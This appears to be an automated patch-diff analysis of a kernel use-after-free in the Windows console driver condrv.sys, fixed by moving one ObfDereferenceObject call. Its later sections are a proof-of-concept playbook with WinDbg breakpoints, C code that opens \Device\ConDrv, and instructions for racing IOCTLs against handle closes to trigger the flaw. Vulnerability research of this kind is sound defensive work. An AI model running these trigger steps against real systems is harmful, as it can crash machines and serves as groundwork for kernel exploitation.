Title: condrv.sys — Use-After-Free (CWE-416) due to premature object reference release in CdCreateDefaultObjectClient fixed
Date: 2026-03-10
Slug: condrv_98e27fa8-condrv-report-20260628-221048
Category: Corpus
Author: Argus
Summary: KB5078752
Severity: Medium
KBDate: 2026-03-10

## 1. Overview

| Item | Value |
|---|---|
| Unpatched binary | `condrv_unpatched.sys` |
| Patched binary | `condrv_patched.sys` |
| Overall similarity | 0.9905 |
| Matched functions | 117 |
| Changed functions | 1 (`CdCreateDefaultObjectClient (sub_1C000A170)`) |
| Identical functions | 116 |
| Unmatched (either direction) | 0 |

**Verdict:** The patch relocates a single `ObfDereferenceObject(Object)` call from immediately after a shared-pushlock release (0x1c000a274) to the end of every control-flow path (0x1c000a33a). That single move eliminates a kernel Use-After-Free on the console driver's connection object, which is reachable from user mode via `DeviceIoControl` against `\Device\ConDrv`.

---

## 2. Vulnerability Summary

### Finding 1 — Premature `ObfDereferenceObject` → UAF in `CdCreateDefaultObjectClient (sub_1C000A170)`

- **Severity:** Medium
- **Class:** CWE-416 Use-After-Free (kernel pool)
- **Reach:** `\Device\ConDrv` via `IRP_MJ_DEVICE_CONTROL`

#### Root cause

`CdCreateDefaultObjectClient (sub_1C000A170)` handles a console-connection / server-IO-completion IOCTL in `condrv.sys`. It obtains a referenced pointer to a console *file object* — call it `Object` — either via a fast IRP-stack cached pointer, or via the slow path through `CdGetProcessConnection (sub_1c00098b0)` (`ObReferenceObjectByHandle` + `ObfReferenceObject`). From `Object` it derives two pointers it will reuse heavily:

- `rsi = *(Object + 0x18)` — the connection data (lives in `FsContext2`).
- `rdi_1 = *(rsi + 0x18)` — the server connection structure.

The function then:

1. Takes a shared push lock (`ExAcquirePushLockSharedEx` inside `KeEnterCriticalRegion`).
2. Reads `rdi_1[0xC0]` (an additional referenced object, `Object_1`) and references it.
3. Releases the push lock (`KeLeaveCriticalRegion` at `0x1c000a265`).
4. **Calls `ObfDereferenceObject(Object)` at `0x1c000a274`** — this is the bug. At this point all subsequent work is still pending, but the only reference this function was pinning has just been dropped.
5. Continues to dereference `rsi` and `rdi_1` (which were derived from `Object`).

If, racing against another thread that is closing the same console handle, `Object`'s reference count hits zero on the dereference at step 4, the object manager invokes the console cleanup routine, freeing both `Object` and the `FsContext2` connection data (`rsi`). The three later accesses then operate on freed pool:

| Address | Instruction | Effect |
|---|---|---|
| `0x1c000a2a9 / 0x1c000a2b2` | `test rsi,rsi` → `call PsIsSystemProcess(*(rsi+0x20))` | Dereferences freed pool for `rsi+0x20` |
| `0x1c000ba75` | `mov [rbx+0x8], rdi` | Stores a dangling `rdi_1` into a freshly allocated structure |
| `0x1c000ba79` | `lock inc qword [rdi+0x18]` | Atomic increment on freed pool memory |

Reachability constraints:
- The `rsi` accesses only occur on the slow path (`CdGetProcessConnection`), where `rsi` (the connection data) is non-NULL. On the fast path `rsi == 0`, so the `test rsi,rsi` at `0x1c000a2a9` short-circuits and none of the three accesses above are reached.
- The last two accesses (`mov [rbx+0x8], rdi` and `lock inc [rdi+0x18]`) are additionally gated behind `PsIsSystemProcess(*(rsi+0x20)) != 0` — they are reached only if the connection's owning process is the System process. That predicate is not attacker-controlled for an ordinary connection, so the dangling-store and atomic-increment writes are not a general unprivileged primitive. The `*(rsi+0x20)` read fed to `PsIsSystemProcess` is itself the freed-pool access that fires first on the slow path.

The patch moves `ObfDereferenceObject(Object)` to the tail of every code path (after `PsIsSystemProcess`, after the store into the new allocation, and after the lock-inc), guaranteeing `rsi`/`rdi_1` are valid throughout.

#### Reachable entry point & call chain

1. User-mode `NtCreateFile`/`CreateFileW` on `\\.\Device\\ConDrv` (or any path that resolves to it through the console API).
2. `DeviceIoControl` issuing `IRP_MJ_DEVICE_CONTROL` to the device.
3. Dispatch routine `CdpDispatchDeviceControl` (or `CdpConnectionIoctl`) decodes the IOCTL.
4. `CdCreateDefaultObjectClient` has no direct caller in the disassembly; it is reached through an indirect (function-pointer) call from the connection dispatch. Its signature is `CdCreateDefaultObjectClient(PIRP Irp, int subcode)`.
5. Lands in `CdCreateDefaultObjectClient (0x1C000A170)`, the connection-establishment / server-IO-completion handler.

---

## 3. Pseudocode Diff

```c
// ---------- UNPATCHED (vulnerable) ----------
NTSTATUS CdCreateDefaultObjectClient (sub_1C000A170)(IRP* Irp, ...) {
    Object = /* from IRP stack (fast) or CdGetProcessConnection (sub_1c00098b0) (slow) */;
    rsi        = Object->ConnectionData;          // *(Object + 0x18)
    rdi_1      = rsi->ServerConn;                 // *(rsi + 0x18)

    KeEnterCriticalRegion();
    ExAcquirePushLockSharedEx(&rdi_1->Lock);
    Object_1 = rdi_1->LinkedObject;               // rdi_1[0xC0]
    ObfReferenceObject(Object_1);
    ExReleasePushLockSharedEx(&rdi_1->Lock);
    KeLeaveCriticalRegion();

    ObfDereferenceObject(Object);   // <<< BUG: drops Object ref too early
                                    //     If concurrent close drops the last
                                    //     ref, Object + rsi are freed HERE.

    if (rsi != NULL) {                          // UAF #1: rsi may be freed
        if (PsIsSystemProcess(rsi->Process)) {  // UAF: deref *(rsi+0x20)
            ...
        }
    }

    rax_5 = CdpAllocateClient (sub_1c000a320)(/* pool tag */);      // allocate new conn struct
    rax_5[1] = rdi_1;                           // UAF #2: dangling pointer store
    _InterlockedIncrement(&rdi_1->RefCount);    // UAF #3: lock inc on freed pool
    ...
    return status;
}

// ---------- PATCHED (fixed) ----------
NTSTATUS CdCreateDefaultObjectClient (sub_1C000A170)(IRP* Irp, ...) {
    Object = /* same acquisition */;
    rsi        = Object->ConnectionData;
    rdi_1      = rsi->ServerConn;

    KeEnterCriticalRegion();
    ExAcquirePushLockSharedEx(&rdi_1->Lock);
    Object_1 = rdi_1->LinkedObject;               // rdi_1[0xC0]
    ObfReferenceObject(Object_1);
    ExReleasePushLockSharedEx(&rdi_1->Lock);
    KeLeaveCriticalRegion();

    // NO ObfDereferenceObject here — rsi / rdi_1 stay valid.

    if (r15 /* == old rsi */ != NULL) {
        if (PsIsSystemProcess(r15->Process)) {  // safe: refcount still held
            ...
        }
    }

    rax_5 = CdpAllocateClient (sub_1c000a3b0)(/* pool tag */);      // helper renamed/moved only
    rax_5[1] = rdi_1;                           // safe
    _InterlockedIncrement(&rdi_1->RefCount);    // safe
    ...
    ObfDereferenceObject(Object);   // <<< FIX: deref moved to end of every path
    return status;
}
```

Notes:
- The `CdServerType` type-check reads the same descriptor in both builds, and the `CdpAllocateClient` helper moved from `0x1c000a320` to `0x1c000a3b0`; both are pure build-layout artifacts, **not** semantic changes.
- Register renames (`r15↔r13`, `r14↔rsi`, `esi↔r15`, etc.) are a consequence of the compiler reordering the deref and are not security-relevant.

---

## 4. Assembly Analysis

### Unpatched vulnerable sequence

```asm
; ---- shared-pushlock release, then EARLY dereference ----
0x1c000a259: call    qword ptr [<ExReleasePushLockSharedEx>]
0x1c000a265: call    qword ptr [<KeLeaveCriticalRegion>]
0x1c000a274: call    qword ptr [<ObfDereferenceObject>]    ; *** BUG: ref dropped ***
            ;          rcx = Object                        ;      if refcount -> 0,
            ;                                              ;      Object + rsi freed

; ---- UAF #1: dereference of rsi (== Object->ConnectionData) ----
0x1c000a2a9: test    rsi, rsi                              ; rsi may be dangling
0x1c000a2ac: jz      short skip_proc_check
0x1c000a2ae: mov     rcx, qword ptr [rsi + 0x20]           ; load from freed pool
0x1c000a2b2: call    qword ptr [<PsIsSystemProcess>]       ; UAF: deref freed mem

; ... (control flow continues; pool reclamation can occur here) ...

; ---- UAF #2 & #3: write rdi into new struct, then inc refcount ----
0x1c000ba75: mov     qword ptr [rbx + 0x8], rdi            ; UAF: dangling store
            ;                                              ;      (rdi_1 -> freed pool)
0x1c000ba79: lock inc qword ptr [rdi + 0x18]               ; UAF: atomic inc on freed
```

### Patched fixed sequence

```asm
; ---- shared-pushlock release — NO dereference here ----
0x1c000a273: call    qword ptr [<ExReleasePushLockSharedEx>]
0x1c000a27f: call    qword ptr [<KeLeaveCriticalRegion>]
            ; (no ObfDereferenceObject — straight to PsIsSystemProcess)

0x1c000a2ee: test    r15, r15                              ; r15 == old rsi, valid
0x1c000a2f1: jz      short skip_proc_check
0x1c000a2f3: mov     rcx, qword ptr [r15 + 0x20]           ; safe
0x1c000a2f7: call    qword ptr [<PsIsSystemProcess>]

; ... (same control flow) ...

0x1c000a30e: mov     qword ptr [rbp + 0x8], rdi            ; safe (rdi_1 still pinned)
0x1c000a312: lock inc qword ptr [rdi + 0x18]               ; safe

; ---- dereference deferred to end of all paths ----
0x1c000a33a: call    qword ptr [<ObfDereferenceObject>]    ; *** FIX ***
            ;          rcx = Object
```

**Key takeaways from the diff:**

- The vulnerable instruction is the `call ObfDereferenceObject` at `+0x104` from the function start (`0x1c000a274 − 0x1c000a170 = 0x104`).
- Between the early deref and the freed-pool accesses there are only a handful of instructions and branches (the `lock inc [rdi+0x18]` at `0x1c000ba79` lives in an out-of-line cold block reached by a forward branch and a jump back). The race window is small.
- All three UAF accesses are eliminated by moving a single call.

---

## 5. Trigger Conditions

1. **Obtain a handle to `\Device\ConDrv`.** Either via `NtCreateFile("\\Device\\ConDrv", ...)` directly, or implicitly through the Win32 console APIs (`AllocConsole`, `AttachConsole`, console-process creation). The handle must be the kind that ends up routed to `CdCreateDefaultObjectClient (sub_1C000A170)` (connection establishment / server IO completion).

2. **Drive the IOCTL.** Issue the IOCTL that the dispatch routines (`CdpDispatchDeviceControl` or `CdpConnectionIoctl`) route to `CdCreateDefaultObjectClient` (reached via an indirect call). To exercise the freed-pool accesses, the slow path must be taken (`rsi != 0`, i.e. resolution through `CdGetProcessConnection`).

3. **From a second thread, race a close on the same handle.** The close path will drop `Object`'s other references; combined with the early `ObfDereferenceObject` at `0x1c000a274`, this drives the refcount to zero, freeing `Object` and its `FsContext2` (`rsi`).

4. **Win the race window** between:
   - The `call ObfDereferenceObject` at `0x1c000a274`, and
   - The last UAF access — the `lock inc qword [rdi + 0x18]` at `0x1c000ba79`.

   The window is small (a handful of instructions and branches), so winning the race requires the concurrent close to land precisely between the deref and the derived-pointer uses.

5. **Observable confirmation:**
   - A winning race that reads freed pool typically produces a `PAGE_FAULT_IN_NONPAGED_AREA` (0x50) or other pool-corruption bugcheck, with the faulting address inside the previously-allocated console pool and the faulting instruction at `0x1c000a2ae`, `0x1c000ba75`, or `0x1c000ba79`.
   - Driver Verifier (Special Pool / Pool Tracking) flags the freed-pool access at the faulting instruction, which is the reliable way to confirm the bug.

---

## 6. Exploit Primitive & Development Notes

### Primitive (as delivered by the freed-pool accesses)

- **Freed-pool read** via `mov rcx, [rsi+0x20]` → `PsIsSystemProcess(...)`. On the slow path, if `Object` was freed by the early deref, `rsi` (its `FsContext2` connection) is freed pool, so `*(rsi+0x20)` is read from freed memory. This is the first freed-pool access on the slow path and is not gated by any further predicate.
- **Freed-pool atomic write** via `lock inc qword [rdi+0x18]` — an atomic increment at offset 0x18 of the freed server-connection block.
- **Dangling-pointer store** via `mov [rbx+0x8], rdi` — the freed `rdi_1` is recorded into the freshly allocated connection structure.

Constraint on the two write-side accesses: both live in the block reached only when `PsIsSystemProcess(*(rsi+0x20)) != 0`, i.e. only when the connection's owning process is the System process. That predicate is not attacker-controlled for an ordinary connection, so the atomic-increment and dangling-store are not a general unprivileged write primitive. What an unprivileged caller can drive on the slow path is the freed-pool read and the general use of freed connection/server-connection memory, whose most likely observable effect is a kernel crash.

Escalation beyond that (pool grooming to reclaim the freed block, promotion to arbitrary read/write, token theft) is not demonstrable from these two binaries and is not claimed here.

---

## 7. Debugger PoC Playbook

Assume kernel debugger (WinDbg/KD) attached to `condrv_unpatched.sys`. Module base and offsets below assume `condrv!CdCreateDefaultObjectClient (sub_1C000A170)` is loaded at the same VA as in the diff; rebalance with `lm condrv` if not.

### Breakpoints

```text
bp condrv+0xA170 "!.echo \"[+] entered CdCreateDefaultObjectClient (sub_1C000A170)\"; r rcx; rdx; r8; qwo @rsp+0x28"
bp condrv+0xA274 "!.echo \"[+] EARLY ObfDereferenceObject — about to drop Object ref\"; r rcx; !object @rcx"
bp condrv+0xA2A9 "!.echo \"[+] UAF #1: rsi check\"; r rsi; !pool @rsi 2"
bp condrv+0xA2AE "!.echo \"[+] UAF #1 deref: *(rsi+0x20)\"; r rsi; u @rip L1; qwo @rsi+0x20"
bp condrv+0xBA75 "!.echo \"[+] UAF #2: dangling store rdi into new struct\"; r rdi; r rbx; !pool @rdi 2"
bp condrv+0xBA79 "!.echo \"[+] UAF #3: lock inc [rdi+0x18]\"; r rdi; qwo @rdi+0x18"
bp condrv+0xA33A "!.echo \"[+] PATCHED-side location — if you see this, you're on the fixed build\""
```

(Offsets are file-relative; convert by `condrv+0x…` — `0x1c000a170` becomes `condrv+0xA170` if `condrv` is loaded at `0x1C0000000`. Always confirm with `u condrv!CdCreateDefaultObjectClient (sub_1C000A170) L20`.)

### What to inspect

- **At function entry (`condrv+0xA170`):** `rcx` is the IRP, `rdx` often the IOCTL-coded arg, `r8` the connection object's vtable-derived context. Walk the IRP stack via `dx -r2 (*((nt!_IRP*)@rcx)).Tail.Overlay.CurrentStackLocation` to see `Parameters.DeviceIoControl.IoControlCode` and `InputBufferLength`.
- **At `condrv+0xA274` (the bug):** `rcx` = `Object`. Use `!object @rcx` to confirm it is a file object, `!pool @rcx 2` to read its pool header / tag and outstanding reference count via `!obtrace @rcx` (if object tracing is enabled with `gflag +otl`).
- **At `condrv+0xA2A9`:** `rsi` should equal `Object->FsContext2`. If `!pool @rsi 2` shows the block is freed (`*FREED*` / not in active list), the bug fired.
- **At `condrv+0xBA75` / `+0xBA79`:** `rdi` is `rdi_1` = `rsi->ServerConn`. If `!pool @rdi 2` shows free state, the atomic increment will corrupt whatever has reclaimed the pool slot — inspect with `dp @rdi L8` to see the current contents.

### Key instructions / offsets

| Offset (module-relative) | What | Notes |
|---|---|---|
| `+0xA265` | `call KeLeaveCriticalRegion` | Marks end of the lock-hold window |
| `+0xA274` | `call ObfDereferenceObject(Object)` | **The bug** — removed from this site in the patch |
| `+0xA2A9` | `test rsi, rsi` | First UAF access |
| `+0xA2AE` | `mov rcx, [rsi+0x20]` | Deref through freed `rsi` |
| `+0xBA75` | `mov [rbx+0x8], rdi` | Dangling-pointer store |
| `+0xBA79` | `lock inc [rdi+0x18]` | Atomic write to freed pool — primary primitive |
| `+0xA33A` | `call ObfDereferenceObject(Object)` | Patched position (end of path) |

### Trigger setup (user mode)

1. **Device handle:**
   ```c
   HANDLE h;
   UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\Device\\ConDrv");
   OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, OBJ_CASE_INSENSITIVE, NULL, NULL };
   IO_STATUS_BLOCK iosb;
   NtCreateFile(&h, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb, NULL, 0,
                FILE_SHARE_READ|FILE_SHARE_WRITE, FILE_OPEN,
                FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
   ```
   (Equivalent: trigger the path indirectly via `AllocConsole` on a child process.)

2. **Identify the IOCTL** that routes to `CdCreateDefaultObjectClient (sub_1C000A170)`. Set the entry breakpoint first; once hit, dump the IRP's `IoControlCode`:
   ```text
   bp condrv+0xA170
   ; on hit:
   dx -r2 (*((nt!_IRP*)@rcx)).Tail.Overlay.CurrentStackLocation
   ```
   The `Parameters.DeviceIoControl.IoControlCode` value is the IOCTL you must replay from user mode via `NtDeviceIoControlFile(h, NULL, NULL, NULL, &iosb, <ioctl>, in, inlen, out, outlen)`.

3. **Race the close:**
   ```c
   HANDLE h2; DuplicateHandle(GetCurrentProcess(), h, GetCurrentProcess(), &h2, 0, FALSE, DUPLICATE_SAME_ACCESS);
   // Thread A:
   //   while (alive) { NtDeviceIoControlFile(h, ...); }
   // Thread B:
   //   while (alive) { CloseHandle(h); CloseHandle(h2); h = reopen(); h2 = dup(h); }
   ```
   Tighten the window by pinning Thread A to a single CPU (`SetThreadAffinityMask`) and elevating its priority.

### Expected observation

- **With Driver Verifier Special Pool enabled** (`verifier /standard /driver condrv.sys`): the freed-pool access on a winning race is flagged by the verifier at the faulting instruction.
- **Without DV:** a `0x50 PAGE_FAULT_IN_NONPAGED_AREA` (or other pool-corruption bugcheck), faulting address in the console driver's pool range, faulting instruction at `condrv+0xA2AE`, `+0xBA75`, or `+0xBA79`.

### Struct / offset notes

```text
Object (FILE_OBJECT-derived console object)
  +0x18  FsContext2   -> rsi   (connection data block)
rsi (connection data)
  +0x18  ServerConn   -> rdi_1 (server connection structure)
  +0x20  Process      (PEPROCESS*, fed to PsIsSystemProcess)
rdi_1 (server connection structure)
  +0x18  RefCount     (atomic — target of the UAF lock-inc)
  +0x28  Lock         (EX_PUSH_LOCK, taken shared)
  +0xC0  LinkedObject (read under the shared lock — Object_1)
```

---

## 8. Changed Functions — Full Triage

Only one function changed; the diff is binary-minimal.

### `CdCreateDefaultObjectClient (sub_1C000A170)` — similarity 0.9029 — `security_relevant`

- **Behavioral change (the fix):** `ObfDereferenceObject(Object)` relocated from `+0x104` (right after `KeLeaveCriticalRegion`) to `+0x1CA` (`0x1c000a33a`, end of every code path). This single change eliminates the UAF window for `rsi` and `rdi_1`.
- **Cosmetic / non-security changes:**
  - The fast-path type check reads the same `CdServerType` global descriptor in both builds (its raw address moves with the build's rodata layout, not a semantic change).
  - Allocation helper address shifted: `CdpAllocateClient` moved from `0x1c000a320` to `0x1c000a3b0` (same function body, build-layout difference — every function after `CdCreateDefaultObjectClient` slid because that function grew by ~0x90 bytes to hold the added exit-path derefs).
  - Register allocation reorganized to support the reordered control flow — pure compiler artifact.

No other functions changed.

---

## 9. Unmatched Functions

- **Removed:** none.
- **Added:** none.

This is a strictly in-place fix; no new mitigations or sanitizer helpers were introduced. The patch is the minimal possible change.

---

## 10. Confidence & Caveats

**Confidence in the change and its direction: High. Confidence in exploitability beyond a crash: Low.**

- The diff is minimal (one function, one relocated call). The assembly evidence is unambiguous: early deref at `+0x104` (`0x1c000a274`), freed-pool read at `+0x139` (`0x1c000a2a9`/`0x1c000a2ae`), atomic write at `+0x1909` (`0x1c000ba79`), and the moved deref at `+0x1CA` (`0x1c000a33a`) in the patched build.
- The semantic — `ObfDereferenceObject` should be the *last* use of an object pointer derived via `ObfReference*` — is a textbook reference-counting rule, and the patch restores exactly that ordering.
- The function name `CdCreateDefaultObjectClient`, the `\Device\ConDrv` reach, and the `PsIsSystemProcess` access align with the console-driver attack surface.
- The severity is Medium rather than High because the write-side accesses are gated behind a non-attacker-controlled `PsIsSystemProcess` predicate (see §2/§6); the reachable unprivileged effect is a racy freed-pool access whose most likely outcome is a crash. Escalation to arbitrary read/write or privilege escalation is not demonstrable from these binaries.

**Assumptions to verify manually before PoC:**

1. **Exact IOCTL code** that routes to `CdCreateDefaultObjectClient (sub_1C000A170)`. The diff does not list it; recover it as described in §7 by breaking on the function and reading the IRP's `IoControlCode`.
2. **Pool tag and size** of `Object` and `rsi`. Recover with `!pool @rcx 2` and `!pool @rsi 2` after the entry breakpoint hits.
3. **The race-closing path** that drops `Object`'s other references. The diff identifies the bug as "racy with handle close," but the exact other side (a user-mode `CloseHandle`, an internal `ObCloseHandle`, or an internal driver deref) was not cross-referenced.
4. **Whether the slow path (`CdGetProcessConnection (sub_1c00098b0)`) or the fast (IRP-stack cached) path is taken.** The diff mentions both; a successful race may require forcing the slow path, which may need specific input-buffer contents.
5. **Default reference count of `Object`** at function entry — the race requires that the patch-side deref be the *final* drop. `!obtrace @rcx` with `gflag +otl` will show this directly.

Verify those five items with the breakpoints in §7 before investing in exploit reliability work.
